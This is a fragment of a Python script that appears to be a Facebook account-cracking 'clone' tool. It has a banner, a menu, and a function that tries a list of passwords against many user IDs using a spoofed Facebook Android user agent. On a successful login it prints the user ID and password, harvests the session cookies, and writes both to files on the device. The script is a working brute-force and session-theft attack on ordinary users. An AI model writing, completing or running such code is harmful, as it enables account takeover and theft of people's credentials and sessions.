...
logo=("""   \33[1;37m
 ...
 .d8888b.  888    888 8888888 888b    888 
d88P  Y88b 888    888   888   8888b   888 
888    888 888    888   888   88888b  888 
888        8888888888   888   888Y88b 888 
888  88888 888    888   888   888 Y88b888 
888    888 888    888   888   888  Y88888 
Y88b  d88P 888    888   888   888   Y8888 
 "Y8888P88 888    888 8888888 888    Y888 
...
→   Github            : FREE USER
→   Tools             : FREEEEEEE
\x1b[1;92m→   Version           : 0.1\33[1;37m
         4G/3G full speed internet
\33[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
...
def AFG():
		...
		try:
			...
			limit = 5000
		clear()
		print('\033[1;32m \n [1] \033[1;32mFIRST METHOD ')
		linex()
		mthd = input(' Choose: ')
		clear()
		print(' \n\033[1;32m [1] \033[1;32mJUST AFG CLONE ')
		linex()
		pcs = input(' [?] Select: ')
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;36m [HAZRAT JANI]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/"+fbav+";FBBV/"+fbbv+";FBDM/{density=1.5,width=480,height=854};FBLC/es_LA;FBCR/BITEL;FBMF/Etisalat;FBBD/Etisalat;FBPN/com.facebook.katana;FBDV/Roshan LUA-L21;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ HAZRAT~OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                      #  print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[1;36m'"Cookie:\33[0;m\033[1;35m "+coki)
                                        open('/sdcard/F--COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/F--OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
